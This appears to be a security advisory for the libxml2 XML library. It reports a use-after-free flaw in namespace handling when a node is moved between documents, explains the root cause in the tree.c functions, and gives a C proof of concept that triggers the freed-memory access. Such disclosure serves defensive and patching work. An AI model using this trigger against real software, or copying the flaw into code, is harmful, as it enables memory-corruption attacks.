Namespace Use-After-Free in xmlSetTreeDoc()

File: gnome/libxml2/libxml2/tree.c (commit 22f9d730)

CWE: CWE-416: Use After Free

Function: xmlSetTreeDoc

Discovered by: Ahmed Lekssays (Qatar Computing Research Institute)

Summary

A use-after-free (UAF) vulnerability exists in namespace handling when nodes are moved between documents. The bug occurs in xmlAddChild() and xmlReplaceNode() functions which fail to update namespace pointers during cross-document operations.

Root Cause

The vulnerability exists in xmlNodeSetDoc() function (tree.c:2457-2560) which recursively updates node document pointers but never updates node->ns namespace pointers. When nodes with namespaces are moved between documents:

xmlAddChild() or xmlReplaceNode() calls xmlSetTreeDoc()

xmlSetTreeDoc() calls xmlNodeSetDoc()

xmlNodeSetDoc() updates node->doc but leaves node->ns pointing to freed memory

Source document destruction frees namespace memory

Subsequent node serialization triggers UAF

Proof of Concept

Proof of Concept:

#include <libxml/parser.h>
#include <libxml/tree.h>
#include <stdio.h>
#include <stdlib.h>

int main() {
    // Create source document with namespaced element
    xmlDocPtr doc1 = xmlParseDoc(BAD_CAST "<?xml version='1.0'?><root xmlns:ns='http://example.com'><ns:target>Test</ns:target></root>");
    
    // Create destination document  
    xmlDocPtr doc2 = xmlParseDoc(BAD_CAST "<?xml version='1.0'?><root><placeholder/></root>");
    
    // Extract namespaced node from doc1
    xmlNodePtr target = xmlDocGetRootElement(doc1)->children;
    xmlUnlinkNode(target);
    
    // Move node to doc2 - VULNERABLE!
    xmlNodePtr placeholder = xmlDocGetRootElement(doc2)->children;
    xmlReplaceNode(placeholder, target);  // BUG: Creates dangling ns pointer
    
    // Free doc1 - frees namespace memory
    xmlFreeDoc(doc1);
    
    // Trigger UAF by serializing doc2
    xmlChar *result;
    int size;
    xmlDocDumpMemory(doc2, &result, &size);
    
    printf("Result: %s\n", result);
    xmlFree(result);
    xmlFreeDoc(doc2);
    xmlCleanupParser();
    return 0;
}
